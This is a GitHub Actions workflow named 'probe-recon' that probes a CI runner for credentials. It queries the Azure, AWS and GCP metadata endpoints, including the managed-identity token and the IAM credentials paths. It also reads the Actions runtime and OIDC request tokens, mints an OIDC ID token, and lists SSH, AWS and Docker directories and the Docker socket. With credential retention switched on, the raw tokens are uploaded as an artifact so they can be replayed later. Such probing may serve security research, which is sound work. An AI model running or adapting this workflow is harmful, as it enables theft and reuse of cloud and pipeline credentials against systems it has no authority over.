name: probe-recon
'on':
  workflow_dispatch:
concurrency:
  group: probe-recon
  cancel-in-progress: false
permissions:
  id-token: write
jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
    - name: init
      run: 'mkdir -p "$RUNNER_TEMP/probes"

        rm -f "$RUNNER_TEMP/probes"/*

        '
    - name: probe imds-azure-instance
      if: always()
      run: "set +e\nmkdir -p \"$RUNNER_TEMP/probes\"\ncurl -sS --max-time 8 -H \"Metadata: true\" -o \"$RUNNER_TEMP/probes/imds-azure-instance.body\" \\\n     -w '%{http_code} %{time_total} ' \\\n     \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" > \"$RUNNER_TEMP/probes/imds-azure-instance.meta\" 2>\"$RUNNER_TEMP/probes/imds-azure-instance.err\"\necho \"$?\" >> \"$RUNNER_TEMP/probes/imds-azure-instance.meta\"\necho \"--- imds-azure-instance: $(cat \"$RUNNER_TEMP/probes/imds-azure-instance.meta\")\"\n"
    - name: probe imds-azure-token
      if: always()
      run: "set +e\nmkdir -p \"$RUNNER_TEMP/probes\"\ncurl -sS --max-time 8 -H \"Metadata: true\" -o \"$RUNNER_TEMP/probes/imds-azure-token.body\" \\\n     -w '%{http_code} %{time_total} ' \\\n     \"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/\" > \"$RUNNER_TEMP/probes/imds-azure-token.meta\" 2>\"$RUNNER_TEMP/probes/imds-azure-token.err\"\necho \"$?\" >> \"$RUNNER_TEMP/probes/imds-azure-token.meta\"\necho \"--- imds-azure-token: $(cat \"$RUNNER_TEMP/probes/imds-azure-token.meta\")\"\n"
    - name: probe imds-aws
      if: always()
      run: "set +e\nmkdir -p \"$RUNNER_TEMP/probes\"\ncurl -sS --max-time 8 -o \"$RUNNER_TEMP/probes/imds-aws.body\" \\\n     -w '%{http_code} %{time_total} ' \\\n     \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\" > \"$RUNNER_TEMP/probes/imds-aws.meta\" 2>\"$RUNNER_TEMP/probes/imds-aws.err\"\necho \"$?\" >> \"$RUNNER_TEMP/probes/imds-aws.meta\"\necho \"--- imds-aws: $(cat \"$RUNNER_TEMP/probes/imds-aws.meta\")\"\n"
    - name: probe imds-gcp
      if: always()
      run: "set +e\nmkdir -p \"$RUNNER_TEMP/probes\"\ncurl -sS --max-time 8 -H \"Metadata-Flavor: Google\" -o \"$RUNNER_TEMP/probes/imds-gcp.body\" \\\n     -w '%{http_code} %{time_total} ' \\\n     \"http://metadata.google.internal/computeMetadata/v1/\" > \"$RUNNER_TEMP/probes/imds-gcp.meta\" 2>\"$RUNNER_TEMP/probes/imds-gcp.err\"\necho \"$?\" >> \"$RUNNER_TEMP/probes/imds-gcp.meta\"\necho \"--- imds-gcp: $(cat \"$RUNNER_TEMP/probes/imds-gcp.meta\")\"\n"
    - name: probe runtime-token-shell
      if: always()
      run: "set +e\nmkdir -p \"$RUNNER_TEMP/probes\"\n{\nfor v in ACTIONS_RUNTIME_TOKEN ACTIONS_RUNTIME_URL ACTIONS_CACHE_URL ACTIONS_RESULTS_URL ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_ID_TOKEN_REQUEST_TOKEN; do\n  val=$(printenv \"$v\" || true)\n  if [ -n \"$val\" ]; then echo \"$v=PRESENT len=${#val}\"; else echo \"$v=ABSENT\"; fi\ndone\n} > \"$RUNNER_TEMP/probes/runtime-token-shell.body\" 2>\"$RUNNER_TEMP/probes/runtime-token-shell.err\"\nprintf -- '- - %s' \"$?\" > \"$RUNNER_TEMP/probes/runtime-token-shell.meta\"\necho \"--- runtime-token-shell: exit=$(cat \"$RUNNER_TEMP/probes/runtime-token-shell.meta\" | awk '{print $3}') bytes=$(wc -c < \"$RUNNER_TEMP/probes/runtime-token-shell.body\")\"\n"
    - name: probe runtime-token-node
      if: always()
      uses: actions/github-script@v7
      with:
        script: "const fs = require('fs'), crypto = require('crypto');\nconst retain = process.env.RETAIN_CREDENTIALS === '1';\nconst names = ['ACTIONS_RUNTIME_TOKEN','ACTIONS_RUNTIME_URL','ACTIONS_CACHE_URL',\n               'ACTIONS_RESULTS_URL','ACTIONS_ID_TOKEN_REQUEST_URL',\n               'ACTIONS_ID_TOKEN_REQUEST_TOKEN','ACTIONS_CACHE_SERVICE_V2'];\nconst out = {};\nfor (const n of names) {\n  const v = process.env[n];\n  // URLs are endpoints, always kept. Tokens only when retention is on, because\n  // the local replay test needs the actual bearer value to send after the run.\n  out[n] = v ? {present: true, len: v.length,\n                sha256: crypto.createHash('sha256').update(v).digest('hex').slice(0, 16),\n                value: (n.endsWith('_URL') || retain) ? v : null} : {present: false};\n}\nfs.appendFileSync(process.env.RUNNER_TEMP + '/probes/node.jsonl',\n  JSON.stringify({id: 'runtime-token-node', outcome: 'ran', data: out}) + '\\n');"
      env:
        RETAIN_CREDENTIALS: '1'
    - name: probe oidc-claims
      if: always()
      uses: actions/github-script@v7
      with:
        script: "// `core` is injected by actions/github-script; requiring @actions/core here\n// would resolve against the workspace and fail.\nconst fs = require('fs'), crypto = require('crypto');\nlet rec = {id: 'oidc-claims', outcome: 'error', data: {}};\ntry {\n  const tok = await core.getIDToken('api://AzureADTokenExchange');\n  const [h, p] = tok.split('.');\n  const dec = s => JSON.parse(Buffer.from(s, 'base64url').toString('utf8'));\n  rec = {id: 'oidc-claims', outcome: 'ran', data: {\n    header: dec(h), claims: dec(p),\n    sha256: crypto.createHash('sha256').update(tok).digest('hex').slice(0, 16),\n    len: tok.length,\n    raw: process.env.RETAIN_CREDENTIALS === '1' ? tok : null,\n  }};\n} catch (e) { rec.data = {error: String(e.message || e)}; }\nfs.appendFileSync(process.env.RUNNER_TEMP + '/probes/node.jsonl', JSON.stringify(rec) + '\\n');"
      env:
        RETAIN_CREDENTIALS: '1'
    - name: probe vm-residue
      if: always()
      run: 'set +e

        mkdir -p "$RUNNER_TEMP/probes"

        {

        ls -la /home/runner/.ssh /home/runner/.aws /home/runner/.docker 2>&1 | head -40

        find /tmp /var/tmp -maxdepth 2 -newermt "-24 hours" -printf "%T@ %u %p\n" 2>/dev/null | sort -rn | head -40

        ls -la /home/runner/work 2>&1 | head -20

        } > "$RUNNER_TEMP/probes/vm-residue.body" 2>"$RUNNER_TEMP/probes/vm-residue.err"

        printf -- ''- - %s'' "$?" > "$RUNNER_TEMP/probes/vm-residue.meta"

        echo "--- vm-residue: exit=$(cat "$RUNNER_TEMP/probes/vm-residue.meta" | awk ''{print $3}'') bytes=$(wc -c < "$RUNNER_TEMP/probes/vm-residue.body")"

        '
    - name: probe docker-sock
      if: always()
      run: 'set +e

        mkdir -p "$RUNNER_TEMP/probes"

        {

        ls -la /var/run/docker.sock 2>&1

        curl -s --max-time 5 --unix-socket /var/run/docker.sock http://localhost/containers/json 2>&1 | head -c 800

        } > "$RUNNER_TEMP/probes/docker-sock.body" 2>"$RUNNER_TEMP/probes/docker-sock.err"

        printf -- ''- - %s'' "$?" > "$RUNNER_TEMP/probes/docker-sock.meta"

        echo "--- docker-sock: exit=$(cat "$RUNNER_TEMP/probes/docker-sock.meta" | awk ''{print $3}'') bytes=$(wc -c < "$RUNNER_TEMP/probes/docker-sock.body")"

        '
    - name: collect
      if: always()
      env:
        SENSITIVE_IDS: '["imds-azure-token", "oidc-claims"]'
        RETAIN_CREDENTIALS: '1'
      run: "python3 - <<'COLLECT'\nimport base64, hashlib, json, os, pathlib, re\nd = pathlib.Path(os.environ[\"RUNNER_TEMP\"]) / \"probes\"\nsensitive = set(json.loads(os.environ.get(\"SENSITIVE_IDS\", \"[]\")))\nretain = os.environ.get(\"RETAIN_CREDENTIALS\") == \"1\"\nout = {\"probes\": {}, \"runner\": {}}\nfor k in (\"RUNNER_ENVIRONMENT\", \"RUNNER_NAME\", \"GITHUB_RUN_ID\", \"GITHUB_WORKFLOW_REF\",\n          \"GITHUB_REPOSITORY\", \"GITHUB_SHA\", \"ImageOS\", \"ImageVersion\"):\n    out[\"runner\"][k] = os.environ.get(k, \"\")\nout[\"runner\"][\"hostname\"] = os.uname().nodename\nout[\"runner\"][\"kernel\"] = os.uname().release\n\ndef summarise(raw: bytes) -> dict:\n    s = {\"sha256\": hashlib.sha256(raw).hexdigest()[:16], \"len\": len(raw)}\n    if retain:\n        s[\"raw\"] = raw.decode(\"utf-8\", \"replace\")\n    try:\n        j = json.loads(raw)\n        s[\"json_keys\"] = sorted(j)[:20] if isinstance(j, dict) else \"non-object\"\n        tok = j.get(\"access_token\") if isinstance(j, dict) else None\n        if isinstance(tok, str) and tok.count(\".\") == 2:\n            pad = lambda x: x + \"=\" * (-len(x) % 4)\n            s[\"jwt_claims\"] = json.loads(base64.urlsafe_b64decode(pad(tok.split(\".\")[1])))\n    except Exception as exc:\n        s[\"parse_error\"] = str(exc)[:120]\n    return s\n\nfor meta in sorted(d.glob(\"*.meta\")):\n    pid = meta.stem\n    fields = meta.read_text().split()\n    rec = {\"id\": pid}\n    rec[\"http_code\"] = fields[0] if len(fields) > 0 else \"\"\n    rec[\"time_total\"] = fields[1] if len(fields) > 1 else \"\"\n    rec[\"exit\"] = int(fields[2]) if len(fields) > 2 and fields[2].lstrip(\"-\").isdigit() else -1\n    body_path = d / (pid + \".body\")\n    raw = body_path.read_bytes() if body_path.exists() else b\"\"\n    if pid in sensitive:\n        rec[\"body_summary\"] = summarise(raw)\n    else:\n        rec[\"body_b64\"] = base64.b64encode(raw[:8192]).decode()\n        rec[\"body_truncated\"] = len(raw) > 8192\n    err = d / (pid + \".err\")\n    if err.exists():\n        rec[\"stderr\"] = err.read_text(errors=\"replace\")[:400]\n    out[\"probes\"][pid] = rec\n\nnode = d / \"node.jsonl\"\nif node.exists():\n    for line in node.read_text(errors=\"replace\").splitlines():\n        if not line.strip():\n            continue\n        try:\n            rec = json.loads(line)\n        except Exception:\n            continue\n        out[\"probes\"][rec.get(\"id\", \"node-unknown\")] = rec\n\n(d / \"results.json\").write_text(json.dumps(out, indent=1, sort_keys=True))\nprint(json.dumps({\"collected\": sorted(out[\"probes\"])}, indent=1))\nCOLLECT\n"
    - name: upload
      if: always()
      uses: actions/upload-artifact@v4
      with:
        name: probe-recon
        path: ${{ runner.temp }}/probes/results.json
        retention-days: 1
        if-no-files-found: error
